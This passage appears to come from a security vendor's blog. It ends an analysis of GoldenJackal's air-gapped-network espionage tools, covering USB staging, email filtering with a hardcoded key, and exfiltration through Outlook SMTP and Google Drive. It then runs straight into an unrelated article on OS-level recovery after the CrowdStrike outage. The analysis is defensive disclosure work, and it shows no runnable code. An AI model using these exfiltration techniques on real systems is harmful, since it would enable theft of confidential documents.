run and deleted, along with the batch file, once it&rsquo;s done running. While we didn&rsquo;t observe the contents of the <span style="font-family: courier new, courier, monospace;">update</span> component, it is likely that it collects files and stages them in the <span style="font-family: courier new, courier, monospace;">trash</span> directory on the removable drive, since the path to that directory is passed as an argument to <span style="font-family: courier new, courier, monospace;">update</span>.</p> <p>When GoldenAce finds that the directory <span style="font-family: courier new, courier, monospace;">trash</span> already exists on a drive, instead of copying files to the drive, it copies files in the <span style="font-family: courier new, courier, monospace;">trash</span> directory to <span style="font-family: courier new, courier, monospace;">C:\ProgramData\Microsoft\Windows\DeviceMetadataCache</span>.</p> <h4>HTTP server</h4> <p>We observed <a href="https://github.com/python/cpython/blob/3.12/Lib/http/server.py">Python&rsquo;s HTTP server</a>, packaged with PyInstaller, being executed via <span style="font-family: courier new, courier, monospace;">C:\Windows\system32\cmd.exe /K C:\Windows\msahci.cmd</span>. Unfortunately, we didn&rsquo;t observe the contents of the <span style="font-family: courier new, courier, monospace;">msahci.cmd</span> file, so we don&rsquo;t know the arguments passed for execution, such as the port for the server to listen on.</p> <h4>GoldenBlacklist</h4> <p>As a processing component, GoldenBlacklist downloads an encrypted archive from a local server, and processes email messages contained in it, to keep only those of interest. Then it generates a new archive for some other component to exfiltrate.</p> <p>The URL to retrieve the initial archive is hardcoded: <span style="font-family: courier new, courier, monospace;">https://&lt;local_ip_address&gt;/update46.zip</span>. The downloaded file is saved as <span style="font-family: courier new, courier, monospace;">res.out</span>, and AES decrypted with the hardcoded key <span style="font-family: courier new, courier, monospace;">k9ksbu9Q34HBKJuzHIuGTfHL9xCzMl53vguheOYA8SiNoh6Jqe62F7APtQ9pE</span>, using a legitimate <a href="https://www.openssl.org/" target="_blank" rel="noopener">OpenSSL</a> executable.</p> <p>The decrypted archive, <span style="font-family: courier new, courier, monospace;">update46.tar.gz</span>, is extracted in memory, and only those files that match certain criteria are written to a subdirectory <span style="font-family: courier new, courier, monospace;">tmp</span>, in the directory where the malware is running. Criteria:</p> <ul> <li>The file does not contain any email on a blocklist of email addresses. This is done to remove email messages that come from senders that usually are not interesting. While we can&rsquo;t include the full list here, it&rsquo;s worth mentioning that many of the email addresses are related to newsletters and press releases. It&rsquo;s important to note that the attackers must have been operating for some time to build a list like this.</li> <li>The file contains the string <span style="font-family: courier new, courier, monospace;">Content-Type: application</span>. This is to keep email messages that have attachments, such as PDF files, Microsoft Office files, and archives, to name a few.</li> </ul> <p>Once the files are selected, GoldenBlacklist archives the <span style="font-family: courier new, courier, monospace; white-space: nowrap;">tmp</span> directory and encrypts it with <span style="font-family: courier new, courier, monospace; white-space: nowrap;">openssl.exe</span>, using the same encryption key as the one used to decrypt the initial archive. The resulting file is <span style="font-family: courier new, courier, monospace; white-space: nowrap;">archive.out</span>. All intermediate files and folders are then deleted, as well as <span style="font-family: courier new, courier, monospace;">openssl.exe</span>, <span style="font-family: courier new, courier, monospace;">libssl-3-x64.dll</span>, and <span style="font-family: courier new, courier, monospace;">libcrypto-3-x64.dll</span>, all located in the malware&rsquo;s directory. This indicates that another component that we didn&rsquo;t observe copied those legitimate binaries there in the first place.</p> <h4>GoldenPyBlacklist</h4> <p>GoldenPyBlacklist is a Python implementation of GoldenBlacklist. It was packaged with PyInstaller and the original name of the script is <span style="font-family: courier new, courier, monospace;">duplxer_black_list_for_external_use.py</span>. Some differences to the other component are:</p> <ul> <li>the initial archive is written as <span style="font-family: courier new, courier, monospace;">ress.out</span>,</li> <li>the key for decryption is the same, except for a different first character,</li> <li>the decrypted archive is extracted to the <span style="font-family: courier new, courier, monospace;">C:\Windows\System32\temp</span> directory for processing,</li> <li>one additional criterion for file selection is added to process only filenames that end in <span style="font-family: courier new, courier, monospace;">.msg</span> (these are files created with Microsoft Outlook),</li> <li>files that do not meet the criteria are deleted,</li> <li>the final archive is created with the 7-Zip archiver, and</li> <li>the final encrypted file is named <span style="font-family: courier new, courier, monospace;">ArcSrvcUI.ter</span>.</li> </ul> <h4>GoldenMailer</h4> <p>Classified as an exfiltration component, GoldenMailer exfiltrates files by sending emails with attachments to attacker-controlled accounts. It was written in Python and packaged with PyInstaller, and the original name of the script is <span style="font-family: courier new, courier, monospace;">send_to_hole.py</span>. GoldenMailer connects to <a href="https://support.microsoft.com/en-us/office/pop-imap-and-smtp-settings-for-outlook-com-d088b986-291d-42b8-9564-9c414e2aa040" target="_blank" rel="noopener">legitimate servers</a> &ndash; either <span style="font-family: courier new, courier, monospace;">smtp-mail.outlook.com</span> or <span style="font-family: courier new, courier, monospace;">smtp.office365.com</span> &ndash; to send email messages, using SMTP on port 587.</p> <p>The configuration is read from a file, <span style="font-family: courier new, courier, monospace;">C:\ProgramData\Microsoft\Windows\Caches\cversions.ini</span>, in the same directory where GoldenMailer is running. The configuration consists of the following five lines:</p> <ul> <li>email address to authenticate to the SMTP server, and to use as both sender and destination address,</li> <li>password to authenticate to the SMTP server,</li> <li>path to directory with archives to exfiltrate,</li> <li>base filename (e.g., <span style="font-family: courier new, courier, monospace;">press.pdf</span>) used for archives to exfiltrate; these archives use the following naming convention: <span style="font-family: courier new, courier, monospace;">&lt;base_filename&gt;.&lt;three_digit_sequence_number&gt;</span>, and</li> <li>number of files to exfiltrate.</li> </ul> <p>We noticed that this configuration file was copied from another PC in the local network. Given that the configuration file indicates how many archives are available to be exfiltrated, we assume that these archives must also be copied over the network, separating the tasks of collection, distribution, and exfiltration. It is likely that the configuration file is generated by the component in charge of collecting files and creating archives for exfiltration, but we didn&rsquo;t observe that component.</p> <p>Figure 10 shows an example of an email message sent by GoldenMailer. The subject has a typo: it reads <span style="font-family: courier new, courier, monospace;">Press realese</span>. The body is very simple and reads: <span style="font-family: courier new, courier, monospace;">Daily News about Israel-Hamas war</span>. These strings are hardcoded in the malware&rsquo;s binary. Only one attachment is sent per email; if there are many archives to exfiltrate, one email is sent for each.</p> <figure class="image"><img src="https://web-assets.esetstatic.com/wls/2024/10-2024/goldenjackal/figure-10.png" alt="" width="678" height="566" /> <figcaption><em>Figure 10. Example of an email message used to exfiltrate files</em></figcaption> </figure> <p>The configuration files that we observed contained the following email addresses:</p> <ul> <li><span style="font-family: courier new, courier, monospace;">mariaalpane@outlook[.]com</span></li> <li><span style="font-family: courier new, courier, monospace;">katemarien087@outlook[.]com</span></li> <li><span style="font-family: courier new, courier, monospace;">spanosmitsotakis@outlook[.]com</span></li> </ul> <h4>GoldenDrive</h4> <p>As opposed to GoldenMailer, this component exfiltrates files by uploading them to Google Drive. Necessary credentials are found in two files, which are hardcoded in the malware: <span style="font-family: courier new, courier, monospace;">credentials.json</span>, which contains fields such as <span style="font-family: courier new, courier, monospace;">client_id</span> and <span style="font-family: courier new, courier, monospace;">client_secret</span>, and <span style="font-family: courier new, courier, monospace;">token.json</span>, with fields such as <span style="font-family: courier new, courier, monospace;">access_token</span> and <span style="font-family: courier new, courier, monospace;">refresh_token</span>. A reference to Google Drive&rsquo;s API and some code snippets in the Go programming language can be found <a href="https://developers.google.com/drive/api/quickstart/go" target="_blank" rel="noopener">here</a>.</p> <p>Similar to GoldenMailer, this component can upload only one file at a time. GoldenDrive is executed with an argument that provides the full path to the file to upload.</p> <h2>Conclusion</h2> <p>In this blogpost, we revealed two new toolsets used by the GoldenJackal APT group to target air-gapped systems of governmental organizations, including those in Europe. Common functionalities include the use of USB drives to steal confidential documents.</p> <p>Managing to deploy two separate toolsets for breaching air-gapped networks in only five years shows that GoldenJackal is a sophisticated threat actor aware of network segmentation used by its targets.</p> <p>A comprehensive list of indicators of compromise (IoCs) can be found in <a href="https://github.com/eset/malware-ioc/tree/master/goldenjackal" target="_blank" rel="noopener">our GitHub repository</a>.</p> <blockquote> <div><em>For any inquiries about our research published on WeLiveSecurity, please contact us at <a href="mailto:threatintel@eset.com?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=autotagging&amp;utm_content=eset-research&amp;utm_term=en">threatintel@eset.com</a>.&nbsp;</em></div> <div><em>ESET Research offers private APT intelligence reports and data feeds.

                <p><b>Building efficient recovery options will drive ecosystem resilience</b></p>     <p>Last week, a <a href="https://homeland.house.gov/2024/09/26/icymi-committee-examines-crowdstrike-processes-in-first-congressional-hearing-on-the-disastrous-july-global-it-outage/">US congressional hearing</a> regarding the <a href="https://www.welivesecurity.com/en/cybersecurity/building-cyber-resilience-lessons-learned-crowdstrike-incident/">CrowdStrike incident in July</a> saw one of the company&rsquo;s executives answer questions from policy makers. One point that caught my interest during the ensuing debate was the suggestion that future incidents of this magnitude could be avoided by some form of automated system recovery.</p> <p>Without getting into the technical details of the incident and how it could have been avoided, the suggestion begs a fundamental question: should automated recovery be the responsibility of the third-party software vendor or is this better framed as a wider issue of the resilience of the operating system (OS), meaning that the latter initiates some form of auto-recovery process in collaboration with a third-party application?</p> <h2>A system that heals itself</h2> <p>A catastrophic boot error that causes a blue screen of death (BSOD) occurs when the device fails to load the software required to present the user with a working operating system, along with the applications installed on the device. For example, it can be triggered when software is installed or updated; in this particular instance, a corrupted/bad update file called on during the boot process of the device triggered the BSOD that ultimately resulted in a well-documented global IT meltdown.</p> <p>Some software, such as security applications, require low-level access, known as &lsquo;kernel mode&rsquo;. If a component at this level fails, a BSOD is a potential outcome. Rebooting the device results in the same BSOD loop and you need expert intervention to break this cycle. (Of course, a BSOD can also occur in &lsquo;user mode&rsquo;, which provides a more restricted environment for software to operate in.)</p> <p>Now, if the mention of kernel mode lost you, let me use an analogy to make things clearer: Think of an engine in a gasoline car. The engine requires a spark to ignite the fuel-air mixture, which is where a spark plug comes in. On a regular maintenance schedule, spark plugs need replacing, otherwise the engine may well fail to perform as expected. A mechanic pops the hood of the car and in go new spark plugs. Turn the key (or push the start button) and the engine starts &ndash; except when it doesn&rsquo;t. That&rsquo;s roughly what happened in this incident, but from a software standpoint.</p> <p>Now, the question arises: should it be the responsibility of a spark plug manufacturer, of which there are many, to create an auto-recovery mechanism for this scenario? In the software context, should the third-party vendor be responsible? Or should the mechanic just pop the hood again, revert to the used and known-to-be-working spark plugs, and restart the car in its previous working state?</p> <p>In my view, the recovery process should be the same in all circumstances, regardless of the third-party software (or spark plugs) involved. Now, the reality is, of course, a little more complex than my analogy, as the spark plugs (the software) are being updated and replaced without the knowledge of the mechanic (the OS). Still, I hope the analogy helps provide a visual of the issue.</p> <h2>The case for OS-managed recovery</h2> <p>If every time a third-party software package updates and makes an adjustment to the core workings of the device, installs a new or modified file required at the time of the boot process, if it was to register with the operating system and the previous working file or state gets put to one side rather than overwritten. In theory, if on the next startup the device gets to a situation of a BSOD then a subsequent boot could, as a first task, check if the device did not start correctly on the previous boot and offer the user an option to recover the replaced file or state with the previous version, removing the update. The same scenario could be used for all third-party software that has kernel-mode access.</p> <p>There is already a precedent for this kind of OS-managed recovery. When a new display driver is installed, but fails to initiate correctly during the boot process, the failure is captured and the operating system will automatically revert to a default state and offer a very low-resolution driver that works with all displays. This exact scenario obviously does not work for cybersecurity products, because there is no default state, but there could be a previous working state prior to the update.</p> <p>Having a recovery option built into the OS for all third-party software would be more efficient than relying on each software vendor to develop their own solution. It would, of course, need consultation and collaboration between OS and third-party software vendors to ensure the mechanism functions and could not be exploited by bad actors.</p> <p>I also accept that I may have (over)simplified the heavy lifting needed to develop such a solution, but even so, it would be more robust than to have thousands of software developers trying to create their own system recovery method. Ultimately, this could go a long way toward improving system resilience and preventing widespread outages &ndash; like the one triggered by the faulty CrowdStrike update.</p>
